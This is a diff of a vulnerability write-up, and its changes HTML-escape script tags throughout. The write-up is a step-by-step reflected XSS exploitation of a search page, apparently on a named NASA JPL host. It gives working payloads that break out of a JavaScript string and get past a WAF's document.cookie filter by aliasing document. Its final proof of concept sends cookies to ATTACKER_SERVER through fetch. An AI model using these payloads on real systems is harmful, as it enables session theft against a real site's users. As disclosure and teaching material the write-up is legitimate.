@@ -190,9 +190,9 @@ The vulnerability stemmed from multiple security weaknesses:
 The critical factor in this vulnerability was the **JavaScript injection context**. The user input was placed inside a JavaScript string within `<script>` tags:
 
 ```html
-<script>
+&lt;script&gt;
 console.log('USER_INPUT_HERE');
-</script>
+&lt;/script&gt;
 ```
 
 This context is particularly dangerous because:
@@ -209,17 +209,17 @@ This context is particularly dangerous because:
 The first exploitation attempt used a standard XSS payload:
 
 ```html
-<script>alert(1)</script>
+&lt;script&gt;alert(1)&lt;/script&gt;
 ```
 
 **Request:**
 ```
-GET /search.htm?search=<script>alert(1)</script>
+GET /search.htm?search=&lt;script&gt;alert(1)&lt;/script&gt;
 ```
 
 **Result:** Request blocked by WAF
 
-**Analysis:** The Web Application Firewall successfully detected and blocked the `<script>` tag opening, indicating the presence of signature-based filtering.
+**Analysis:** The Web Application Firewall successfully detected and blocked the `&lt;script&gt;` tag opening, indicating the presence of signature-based filtering.
 
 ### 5.2 Phase 2: Breaking Out of JavaScript Context
 
@@ -271,7 +271,7 @@ The next iteration involved properly closing the script context:
 
 **Payload:**
 ```
-pwn')%3balert(1)</script>;//
+pwn')%3balert(1)&lt;/script&gt;;//
 ```
 
 **Request:**
@@ -281,9 +281,9 @@ GET /search.htm?search=pwn%27)%3balert(1)%3C/script%3E%3b//
 
 **Resulting HTML:**
 ```html
-<script>
-console.log('pwn');alert(1)</script>;//');
-</script>
+&lt;script&gt;
+console.log('pwn');alert(1)&lt;/script&gt;;//');
+&lt;/script&gt;
 ```
 
 **Result:** ✓ **SUCCESS** - The `alert(1)` executed successfully.
@@ -292,7 +292,7 @@ console.log('pwn');alert(1)</script>;//');
 1. `pwn')` - Closes the console.log string and function call
 2. `%3b` - Semicolon terminates the console.log statement
 3. `alert(1)` - Our injected JavaScript
-4. `</script>` - Closes the script tag
+4. `&lt;/script&gt;` - Closes the script tag
 5. `;//` - Comments out any remaining code to prevent syntax errors
 
 ### 5.5 Phase 5: Cookie Access Attempt
@@ -301,7 +301,7 @@ With code execution confirmed, the next goal was to access and exfiltrate cookie
 
 **Payload:**
 ```
-pwn')%3balert(document.cookie)</script>;//
+pwn')%3balert(document.cookie)&lt;/script&gt;;//
 ```
 
 **Request:**
@@ -320,7 +320,7 @@ GET /search.htm?search=pwn%27)%3balert(document.cookie)%3C/script%3E%3b//
 ### 6.1 WAF Detection and Analysis
 
 The target application was protected by a Web Application Firewall that employed signature-based detection. The WAF blocked requests containing:
-- `<script>` opening tags (but not `</script>` closing tags)
+- `&lt;script&gt;` opening tags (but not `&lt;/script&gt;` closing tags)
 - Direct references to `document.cookie`
 - Other common XSS patterns
 
@@ -332,7 +332,7 @@ To bypass the `document.cookie` filter, a variable obfuscation approach was deve
 
 **Payload:**
 ```javascript
-pwn')%3ba=document%3balert(a.cookie)</script>;//
+pwn')%3ba=document%3balert(a.cookie)&lt;/script&gt;;//
 ```
 
 **Request:**
@@ -345,7 +345,7 @@ GET /search.htm?search=pwn%27)%3ba=document%3balert(a.cookie)%3C/script%3E%3b//
 console.log('pwn');
 a=document;
 alert(a.cookie)
-</script>;//');
+&lt;/script&gt;;//');
 ```
 
 **Result:** ✓ **SUCCESS** - The WAF did not detect this pattern, and cookies were successfully accessed.
@@ -375,7 +375,7 @@ The final proof-of-concept demonstrated complete cookie exfiltration to an attac
 
 **Payload:**
 ```javascript
-pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)</script>//
+pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//
 ```
 
 **URL-Encoded Request:**
@@ -388,7 +388,7 @@ https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27http
 console.log('pwn');
 a=document;
 fetch('https://ATTACKER_SERVER/s='+a.cookie)
-</script>//');
+&lt;/script&gt;//');
 ```
 
 ### 7.2 Attack Flow
